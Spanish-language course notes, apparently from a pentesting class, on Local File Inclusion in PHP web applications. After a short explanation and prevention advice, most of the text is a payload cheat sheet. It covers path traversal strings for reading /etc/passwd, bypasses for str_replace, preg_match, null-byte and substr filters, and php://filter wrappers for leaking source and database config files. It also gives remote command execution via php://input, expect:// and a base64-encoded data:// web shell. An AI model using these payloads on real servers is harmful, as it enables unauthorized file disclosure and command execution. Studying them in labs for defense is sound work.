# LFI

Tags: #LFI #DirectoryPathTraversal 


La vulnerabilidad **Local File Inclusion** (**LFI**) es una vulnerabilidad de seguridad informática que se produce cuando una aplicación web **no valida adecuadamente** las entradas de usuario, permitiendo a un atacante **acceder a archivos locales** en el servidor web.

En muchos casos, los atacantes aprovechan la vulnerabilidad de LFI al abusar de parámetros de entrada en la aplicación web. Los parámetros de entrada son datos que los usuarios ingresan en la aplicación web, como las URL o los campos de formulario. Los atacantes pueden manipular los parámetros de entrada para incluir rutas de archivo local en la solicitud, lo que puede permitirles acceder a archivos en el servidor web. Esta técnica se conoce como “**Path Traversal**” y se utiliza comúnmente en ataques de LFI.

En el ataque de Path Traversal, el atacante utiliza caracteres especiales y caracteres de escape en los parámetros de entrada para navegar a través de los directorios del servidor web y acceder a archivos en ubicaciones sensibles del sistema.

Por ejemplo, el atacante podría incluir “**../**” en el parámetro de entrada para navegar hacia arriba en la estructura del directorio y acceder a archivos en ubicaciones sensibles del sistema.

Para prevenir los ataques LFI, es importante que los desarrolladores de aplicaciones web validen y filtren adecuadamente la entrada del usuario, limitando el acceso a los recursos del sistema y asegurándose de que los archivos sólo se puedan incluir desde ubicaciones permitidas. Además, las empresas deben implementar medidas de seguridad adecuadas, como el cifrado de archivos y la limitación del acceso de usuarios no autorizados a los recursos del sistema.

A continuación, se os proporciona el enlace directo a la herramienta que utilizamos al final de esta clase para abusar de los ‘**Filter Chains**‘ y conseguir así ejecución remota de comandos:

- **PHP Filter Chain Generator**: [https://github.com/synacktiv/php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator)
- [Lab-LFI](https://github.com/NetsecExplained/docker-labs)

```bash 
LFI  --> Incluyes archivos locales de la maquina como:
	1. /etc/passwd
	2. /etc/hosts
	3. /etc/hostname 

# Debemos de tener un parametro '?page=' para poder ver si existe el LFI

1. Se encuentran en CMS (Gestores de contenido) como WordPress
2. Plugins 

En el LFI podemos usar:
1. 'Path Traversal' para evadir algunos filtros 
2. Wrappers
```

## Path Traversal 

```bash 
# Como mejor practica son 6 '../'

❯ /etc/passwd                       # Desde la raiz cargamos el archivo 
❯ ../../../../etc/passwd            # Nos salimos de el dir y apuntamos al archivo 
❯ ....//....//....//etc/passwd      # Evitamos el filtro de 'str_replace' 

# Evitar el filtro 'preg_match' colocando barras y puntos
❯ /etc/////passwd                   # Colocar muchas barras hacer que no haga match 
❯ /etc//./passwd                              

# Si fuera un comando como 'cat' podriamos usar '?' para evadir el 'preg_match'
❯ /et?//??sswd 
❯ /??c/pas??? 

# Cuando se concatena una extension como '.php' al archivo a buscar, podemos usar un NULL Byte, esto sirve en versiones menores a 5.3 en PHP.
❯ /etc/passwd%00                    # Forma de colocar un 'Null Byte'

# Cuando existe un 'substr' en el codigo que hace match con alguna extension, podemos evadir el match de la siguiente manera
❯ /etc/test.txt/.                   # Colocaremos '/.' al final para que no exista el match con la extension '.txt'               
```

## Wrappers en la URL de la Web

```bash 
# Los Wrappers nos ayudan a interpretar el codigo y no a ejecutarlo 
# Archivos importantes que podemos encodear con el filtro 
a) index.php
b) admin/db_connect.php

Notas:
	1. Aveces no es necesario colocar el 'php' ya que las páginas lo concatenan automaticamente


1. # Este filtro nos ayuda a representar el contenido en base64 el cual su resultado lo guardamos en un archivo llamado 'data'
❯ php://filter/convert.base64-encode/resourse=
	❯ cat data | base64 -d | sponge data 
	# d = decodear la base64 
	# sponge = Para ingresar el output en el mismo archivo llamado 'data'

2. # Este wrapper rota cada caracter en 13 posiciones el cual su resultado lo guardamos en un archivo llamado 'data'
❯ php://filter/read=string.rot13/resource=
	❯ cat data | tr '[c-za-bC-ZA-B]' '[p-za-oP-ZA-O]'   # Debemos de empezar con la primer letra que nos aparezca en el output y en la segunda parte colocarnos en la treceaba posicion 

3. # Conversion a nivel de encoding para que no sea interpretado y se muestre en la web
❯ php://filter/convert.iconv.utf-8.utf-16/resource=
```

## Wrappers para hacer un RCE

```bash
# Metodo POST
❯ php://input                   # Debemos de cambiar la peticion a POST en 'Burpsuite' para lograr mandar comandos 
	<?php system('whoami'); ?> # Esto debe de ir en el cuerpo de 'Burpsuite' o el siguiente:
	<?php system($_GET["cmd"]); ?>


# Metodo GET
❯ expect://whoami               # Este wrapper ayuda a inyectar comandos 


# En este wrapper debemos de pasarle una cadena en base64, la cadena es el php de arriba que tiene system(GET)
❯ data://text;plain,base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+
❯ data://text;plain,base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2b&cmd=whoami
	# + = %2b

# Si la cadena esta en base64, con este wrapper podemos decodificarlo
❯ php://filter/convert.base64-decode/resourse=
# Si al momento de usar el wrapper pasado nos regresa un error, podemos hacer lo siguiente:
❯ php://filter/convert.iconv.UTF8.UTF7|convert.base64-decode/resource=
```